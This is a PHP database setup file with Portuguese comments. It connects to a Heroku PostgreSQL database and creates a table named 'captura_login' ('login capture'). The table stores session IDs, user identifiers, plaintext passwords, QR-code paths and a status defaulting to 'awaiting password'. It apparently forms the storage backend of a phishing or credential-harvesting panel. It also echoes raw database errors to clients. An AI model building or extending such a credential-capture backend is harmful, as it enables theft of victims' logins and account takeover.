<?php
// db.php

// Pega a URL do banco de dados da variável de ambiente do Heroku.
$dbUrl = getenv('DATABASE_URL');

if (empty($dbUrl)) {
    // Para testes locais, você pode descomentar a linha abaixo e adicionar suas credenciais.
    // $dbUrl = "postgres://user:pass@host:port/dbname";
    
    // Se ainda estiver vazio, encerra a execução.
    if (empty($dbUrl)) {
        die(json_encode(['success' => false, 'error' => 'DATABASE_URL não configurada.']));
    }
}

$dbopts = parse_url($dbUrl);

$dbHost = $dbopts["host"];
$dbPort = $dbopts["port"];
$dbUser = $dbopts["user"];
$dbPass = $dbopts["pass"];
$dbName = ltrim($dbopts["path"], '/');
$dsn = "pgsql:host=$dbHost;port=$dbPort;dbname=$dbName";

try {
    // Tenta estabelecer a conexão com o banco de dados.
    $pdo = new PDO($dsn, $dbUser, $dbPass);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    // Comando SQL para criar a tabela 'captura_login' SE ELA NÃO EXISTIR.
    $sql_create_table = "
    CREATE TABLE IF NOT EXISTS captura_login (
        id SERIAL PRIMARY KEY,
        session_id VARCHAR(255) NOT NULL,
        identificador VARCHAR(255) NOT NULL,
        senha VARCHAR(255) NULL,
        qrcode_path VARCHAR(255) NULL, -- ADICIONADO --
        status VARCHAR(50) DEFAULT 'aguardando_senha',
        data_criacao TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
    );
    ";
    
    // Executa o comando.
    $pdo->exec($sql_create_table);

} catch (PDOException $e) {
    // Se a conexão ou a criação da tabela falhar, retorna um erro em JSON.
    header('Content-Type: application/json');
    http_response_code(500); // Internal Server Error
    die(json_encode(['success' => false, 'error' => 'Falha na conexão com o banco de dados: ' . $e->getMessage()]));
}

// A variável $pdo está agora disponível para qualquer script que inclua este arquivo.
?>